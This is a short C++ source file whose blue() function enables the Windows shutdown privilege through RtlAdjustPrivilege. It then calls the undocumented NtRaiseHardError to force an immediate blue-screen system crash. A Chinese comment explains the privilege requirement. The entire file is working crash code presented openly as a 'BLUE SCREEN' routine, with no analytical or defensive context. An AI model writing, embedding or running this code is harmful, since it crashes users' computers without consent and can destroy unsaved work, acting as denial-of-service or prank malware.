#include"BLUE SCREEN.h"
#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

int blue() {
    BOOLEAN bl;
    ULONG Response;

    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    // 调用NtRaiseHardError需要有SeShutdownPrivilege

    NtRaiseHardError(0xC0000420L,0, 0, NULL, 6, &Response);
    // BSOD

    return 0;
}